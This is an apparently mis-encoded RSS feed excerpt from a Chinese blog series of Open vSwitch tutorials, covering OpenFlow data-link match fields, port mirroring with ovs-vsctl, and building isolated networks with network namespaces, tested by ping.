&lt;h2 id="osiæ¨¡å‹ç¬¬äºŒå±‚æ•°æ®é“¾è·¯å±‚">OSIæ¨¡å‹ç¬¬äºŒå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‘&lt;/h2>
&lt;p>&lt;em>&lt;code>dl&lt;/code> å³æ˜¯ &lt;code>data link&lt;/code> çš„ç¼©å†™ã€‚&lt;/em>&lt;/p>
&lt;h3 id="dl_typeethertype">dl_type=ethertype&lt;/h3>
&lt;p>åŒ¹é…ä»¥å¤ªç½‘åè®®ç±»å‹ä»¥å¤ªç±»å‹ï¼Œä»¥10åˆ°65535ä¹‹é—´çš„æ•´æ•°ï¼ˆåŒ…æ‹¬0å’Œ65535ï¼‰æŒ‡å®šï¼Œä»¥åè¿›åˆ¶æˆ–ä»¥0xå‰ç¼€çš„åå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>dl_type=0x0800&lt;/code> åŒ¹é…IPv4æ•°æ®åŒ…ï¼Œç­‰åŒäº&lt;code>dl_type=ip&lt;/code> ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x086dd&lt;/code> åŒ¹é…IPv6æ•°æ®åŒ…ï¼Œç­‰åŒäº&lt;code>dl_type=ipv6&lt;/code> ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x0806&lt;/code> åŒ¹é…ARPæ•°æ®åŒ…ï¼Œç­‰åŒäº&lt;code>dl_type=arp&lt;/code> ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x8035&lt;/code> åŒ¹é…RARPæ•°æ®åŒ…ï¼Œç­‰åŒäº &lt;code>dl_type=rarp&lt;/code>ã€‚&lt;/p></description></item><item><title>Open vSwitch å…¥é—¨å®è·µï¼ˆ4ï¼‰ä½¿ç”¨OVSé…ç½®ç«¯å£é•œåƒ</title><link>https://www.typesafe.cn/posts/ovs-learn-4/</link><pubDate>Mon, 28 Dec 2020 19:23:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-4/</guid><description>&lt;h1 id="å‰è¨€">å‰è¨€&lt;/h1>
&lt;p>å½“æˆ‘ä»¬æƒ³è¦åœ¨ä¸å½±å“è™šæ‹Ÿç½‘ç»œè®¾å¤‡æ•°æ®æŠ¥æ–‡æ”¶å‘çš„æƒ…å†µä¸‹è·å–å¯¹åº”è™šæ‹Ÿç½‘ç»œè®¾å¤‡çš„æµé‡æ—¶ï¼Œç«¯å£é•œåƒæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚ç«¯å£é•œåƒæ˜¯æŒ‡å°†ç»è¿‡æŒ‡å®šç«¯å£ï¼ˆé•œåƒç«¯å£ï¼‰çš„æŠ¥æ–‡å¤åˆ¶ä¸€ä»½åˆ°å¦ä¸€ä¸ªæŒ‡å®šç«¯å£ï¼ˆè§‚å¯Ÿç«¯å£ï¼‰ï¼Œé€šè¿‡è§‚å¯Ÿç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡ï¼Œå°±å¯ä»¥æœ‰æ•ˆè¯†åˆ«è™šæ‹Ÿç½‘ç»œçš„è¿è¡Œæƒ…å†µã€‚&lt;/p>
&lt;p>OVSæä¾›äº†ç›¸å…³å‘½ä»¤æ¥é…ç½®æˆ–åˆ é™¤ç«¯å£é•œåƒï¼Œä¸‹é¢æˆ‘ä»¬æ¥å®éªŒä¸€ä¸‹ã€‚&lt;/p>
&lt;h1 id="å¦‚ä½•ä½¿ç”¨">å¦‚ä½•ä½¿ç”¨&lt;/h1>
&lt;h3 id="ç«¯å£é•œåƒç±»å‹">ç«¯å£é•œåƒç±»å‹&lt;/h3>
&lt;p>ç«¯å£é•œåƒåˆ†ä¸ºé•œåƒæºå’Œé•œåƒç›®çš„ä¸¤éƒ¨åˆ†ã€‚&lt;/p>
&lt;h4 id="é•œåƒæº">é•œåƒæº&lt;/h4>
&lt;ul>
&lt;li>select_allï¼šå¸ƒå°”ç±»å‹ï¼ˆtrueï¼Œfalseï¼‰ã€‚è®¾ç½®ä¸º true æ—¶ï¼Œè¡¨ç¤ºæ­¤ç½‘æ¡¥ä¸Šçš„æ‰€æœ‰æµé‡ã€‚&lt;/li>
&lt;li>select_dst_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚è¡¨ç¤ºæ­¤ç«¯å£æ¥æ”¶çš„æ‰€æœ‰æµé‡ã€‚&lt;/li>
&lt;li>select_src_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚è¡¨ç¤ºæ­¤ç«¯å£å‘é€çš„æ‰€æœ‰æµé‡ã€‚&lt;/li>
&lt;li>select_vlanï¼šæ•´å‹ï¼ˆ0-4095ï¼‰ã€‚è¡¨ç¤ºæºå¸¦æ­¤VLANæ ‡ç­¾çš„æµé‡ã€‚&lt;/li>
&lt;/ul>
&lt;h4 id="é•œåƒç›®çš„">é•œåƒç›®çš„&lt;/h4>
&lt;ul>
&lt;li>output_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚æ¥æ”¶æµé‡æŠ¥æ–‡çš„è§‚å¯Ÿç«¯å£ã€‚&lt;/li>
&lt;li>output_vlanï¼šæ•´å‹ï¼ˆ0-4095ï¼‰ã€‚è¡¨ç¤ºåªä¿®æ”¹VLANæ ‡ç­¾ï¼ŒåŸVLANæ ‡ç­¾ä¼šè¢«å‰¥ç¦»ã€‚&lt;/li>
&lt;/ul>
&lt;h3 id="åŸºç¡€æ“ä½œå‘½ä»¤">åŸºç¡€æ“ä½œå‘½ä»¤&lt;/h3>
&lt;p>æ–°å¢ç«¯å£é•œåƒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Bridge &amp;lt;bridge_name&amp;gt; &lt;span style="color:#8be9fd;font-style:italic">mirrors&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>@m &lt;span style="color:#f1fa8c">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">&lt;/span> -- --id&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port0&amp;gt; get Port &amp;lt;port0&amp;gt; &lt;span style="color:#f1fa8c">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">&lt;/span> -- --id&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port1&amp;gt; get Port &amp;lt;port1&amp;gt; &lt;span style="color:#f1fa8c">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">&lt;/span> -- --id&lt;span style="color:#ff79c6">=&lt;/span>@m create Mirror &lt;span style="color:#8be9fd;font-style:italic">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&amp;lt;mirror_name&amp;gt; &lt;span style="color:#ff79c6">select&lt;/span>-dst-port&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port0&amp;gt; &lt;span style="color:#ff79c6">select&lt;/span>-src-port&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port0&amp;gt; output-port&lt;span style="color:#ff79c6">=&lt;/span>@&amp;lt;port1&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>è¿™è¡Œå‘½ä»¤ä¼šè¾“å‡ºä¸€ä¸ªé•œåƒID&lt;/p>&lt;/blockquote>
&lt;p>åˆ é™¤ç«¯å£é•œåƒ&lt;/p>
&lt;pre tabindex="0">&lt;code>ovs-vsctl remove Bridge &amp;lt;bridge-name&amp;gt; mirrors &amp;lt;mirror-id&amp;gt;
&lt;/code>&lt;/pre>&lt;p>åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ªé•œåƒæº&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># è·å–ç«¯å£çš„ID&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl get port &amp;lt;port_name&amp;gt; _uuid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ é•œåƒæº&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_src_port &amp;lt;port-id&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_dst_port &amp;lt;port-id&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šåˆ é™¤ä¸€ä¸ªé•œåƒæº&lt;/p></description></item><item><title>Open vSwitch å…¥é—¨å®è·µï¼ˆ3ï¼‰ä½¿ç”¨OVSæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ</title><link>https://www.typesafe.cn/posts/ovs-learn-3/</link><pubDate>Sun, 27 Dec 2020 11:38:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-3/</guid><description>&lt;h1 id="ä½¿ç”¨ovsæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ">ä½¿ç”¨OVSæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ&lt;/h1>
&lt;h2 id="å‰è¨€">å‰è¨€&lt;/h2>
&lt;p>ä¸Šä¸€èŠ‚æˆ‘ä»¬ä½¿ç”¨OVSæ„å»ºäº†å•æœºéš”ç¦»ç½‘ç»œï¼Œä½†æ˜¯éšç€ç½‘ç»œè§„æ¨¡çš„æ‰©å¼ ï¼Œå•èŠ‚ç‚¹å·²ç»ä¸å†èƒ½æ»¡è¶³ä¸šåŠ¡çš„éœ€è¦ï¼Œåˆ†å¸ƒå¼ç½‘ç»œæˆäº†å¿…ä¸å¯å°‘çš„ç¯èŠ‚ã€‚åˆ†å¸ƒå¼ç½‘ç»œä¸å•èŠ‚ç‚¹ç½‘ç»œåœ¨ç»†èŠ‚å®ç°ä¸ŠåŸºæœ¬ä¸€è‡´ï¼Œåªæœ‰ç‰©ç†ç¯å¢ƒç½‘ç»œè¿çº¿ä¸Šçš„ä¸€ç‚¹åŒºåˆ«ã€‚&lt;/p>
&lt;h2 id="å®éªŒ1åˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ">å®éªŒ1ï¼šåˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ&lt;/h2>
&lt;p>ç½‘ç»œæ‹“æ‰‘å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬æ¯ä¸€å°èŠ‚ç‚¹éƒ½æœ‰ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ ç”¨äºç®¡ç†ï¼Œä¸€å¼ ç”¨äºä¸šåŠ¡ã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨ä¸¤å¼ ç½‘å¡æœ‰ä¸¤ä¸ªåŸå› ï¼š&lt;/p>
&lt;ol>
&lt;li>ç®¡ç†ç½‘å¡ç”¨äºæ—¥å¸¸çš„ç»´æŠ¤ç™»å½•ï¼Œä¸šåŠ¡ç½‘å¡ç”¨äºä¼ è¾“è™šæ‹ŸèŠ‚ç‚¹çš„æ•°æ®æŠ¥æ–‡ï¼Œé¿å…ç›¸äº’ä¹‹é—´å½±å“ã€‚&lt;/li>
&lt;li>æˆ‘ä»¬è¦å°†ä¸šåŠ¡ç½‘å¡ç»‘å®šåˆ°OVSç½‘æ¡¥ä¸Šï¼Œä¹Ÿå°±æ˜¯&lt;code>Normal&lt;/code>ç±»å‹çš„&lt;code>Port&lt;/code>ã€‚è¿™ç§æ–¹å¼æ·»åŠ çš„&lt;code>Port&lt;/code>ä¸æ”¯æŒåˆ†é…IPåœ°å€ï¼Œå¦‚æœä¹‹å‰ç½‘å¡ä¸Šé…ç½®çš„æœ‰IPï¼ŒæŒ‚è½½åˆ°OVSä¸Šé¢ä¹‹åå°†ä¸å¯è®¿é—®ã€‚&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ˜¯ä½¿ç”¨ç‰©ç†ç¯å¢ƒæ­å»ºç½‘ç»œæ‹“æ‰‘ï¼Œéœ€è¦æŠŠä¸šåŠ¡ç½‘å¡å¯¹åº”çš„äº¤æ¢æœºç«¯å£é…ç½®ä¸º&lt;code>trunk&lt;/code>æ¨¡å¼ã€‚å¦‚æœæ˜¯ä½¿ç”¨VmWareæ­å»ºç½‘ç»œæ‹“æ‰‘ï¼Œä¸šåŠ¡ç½‘å¡éœ€è¦é…ç½®ç½‘ç»œç±»å‹ä¸º&lt;code>ä»…ä¸»æœºæ¨¡å¼&lt;/code>ã€‚&lt;/p>&lt;/blockquote>
&lt;p>&lt;img src="https://oss.typesafe.cn/ovs-di-network0.png?t=2" alt="åˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ">&lt;/p>
&lt;h3 id="é…ç½®">é…ç½®&lt;/h3>
&lt;ul>
&lt;li>é…ç½®ç¯å¢ƒ &lt;code>ä¸»æœºA&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># è¯·ä¿®æ”¹eth1ä¸ºå½“å‰å®éªŒç¯å¢ƒçš„ä¸šåŠ¡ç½‘å¡åç§°&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int eth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ ä¸¤ä¸ªå†…éƒ¨ç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet0 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet1 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ ä¸¤ä¸ªnetns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å¯åŠ¨ç«¯å£å¹¶é…ç½®IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip addr add 10.0.0.1/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip addr add 10.0.0.2/24 dev vnet1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é…ç½®ç¯å¢ƒ &lt;code>ä¸»æœºB&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># è¯·ä¿®æ”¹eth1ä¸ºå½“å‰å®éªŒç¯å¢ƒçš„ä¸šåŠ¡ç½‘å¡åç§°&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int eth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ ä¸¤ä¸ªå†…éƒ¨ç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet0 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet1 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ ä¸¤ä¸ªnetns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å¯åŠ¨ç«¯å£å¹¶é…ç½®IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip addr add 10.0.0.3/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip addr add 10.0.0.4/24 dev vnet1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æµ‹è¯•">æµ‹è¯•&lt;/h3>
&lt;ul>
&lt;li>æµ‹è¯• &lt;code>ä¸»æœºA&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ping 10.0.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ping 10.0.0.4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ping 10.0.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ping 10.0.0.4
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æµ‹è¯• &lt;code>ä¸»æœºB&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ping 10.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ping 10.0.0.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ping 10.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ping 10.0.0.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æµ‹è¯•ç»“æœ&lt;/li>
&lt;/ul>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>ä¸»æœºA&lt;/th>
 &lt;th>ä¸»æœºB&lt;/th>
 &lt;th>ping ç»“æœ&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ns0&lt;/td>
 &lt;td>ns0&lt;/td>
 &lt;td>å¯é€šä¿¡ âœ…&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns0&lt;/td>
 &lt;td>ns1&lt;/td>
 &lt;td>å¯é€šä¿¡ âœ…&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns1&lt;/td>
 &lt;td>ns0&lt;/td>
 &lt;td>å¯é€šä¿¡ âœ…&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns1&lt;/td>
 &lt;td>ns1&lt;/td>
 &lt;td>å¯é€šä¿¡ âœ…&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>æ ¹æ®æµ‹è¯•ç»“æœå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨OVSæˆåŠŸçš„è”é€šäº†åˆ†å¸ƒåœ¨ä¸åŒä¸»æœºä¸Šçš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚&lt;/p></description></item><item><title>Open vSwitch å…¥é—¨å®è·µï¼ˆ2ï¼‰ä½¿ç”¨OVSæ„å»ºéš”ç¦»ç½‘ç»œ</title><link>https://www.typesafe.cn/posts/ovs-learn-2/</link><pubDate>Thu, 26 Nov 2020 22:55:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-2/</guid><description>&lt;h1 id="å‰è¨€">å‰è¨€&lt;/h1>
&lt;p>åœ¨å‰é¢æˆ‘ä»¬å·²ç»ä½¿ç”¨Linux Bridgeå®Œæˆäº†å¤šå°ç½‘ç»œè®¾å¤‡çš„é€šä¿¡ï¼Œä½†æ˜¯å®ƒå¯¹äºç½‘ç»œéš”ç¦»çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œé•¿æœŸä»¥æ¥ï¼Œåœ¨Linuxå¹³å°ä¸Šç¼ºå°‘ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„è™šæ‹Ÿäº¤æ¢æœºï¼Œç›´åˆ°OVSçš„å‡ºç°ã€‚&lt;/p>
&lt;h1 id="å®éªŒ">å®éªŒ&lt;/h1>
&lt;p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å°è¯•å®Œæˆä¸¤ä¸ªå®éªŒï¼Œå•æœºæ— éš”ç¦»ç½‘ç»œã€å•æœºéš”ç¦»ç½‘ç»œã€‚&lt;/p>
&lt;h2 id="å®éªŒä¸€å•æœºæ— éš”ç¦»ç½‘ç»œ">å®éªŒä¸€ï¼šå•æœºæ— éš”ç¦»ç½‘ç»œ&lt;/h2>
&lt;p>ä½¿ç”¨ovsæ„å»ºæ— éš”ç¦»ç½‘ç»œéå¸¸ç®€å•ï¼Œåªéœ€è¦æ·»åŠ ä¸€ä¸ªç½‘æ¡¥ï¼Œç„¶ååœ¨è¿™ä¸ªç½‘æ¡¥ä¸Šå†å¢åŠ å‡ ä¸ªå†…éƒ¨ç«¯å£ï¼Œæœ€åæŠŠç«¯å£ç§»åŠ¨åˆ°netnsä¸­å³å¯ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ ç½‘æ¡¥&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ ä¸‰ä¸ªå†…éƒ¨ç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet0 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet1 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet2 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet2 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ ä¸‰ä¸ªnetns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns2
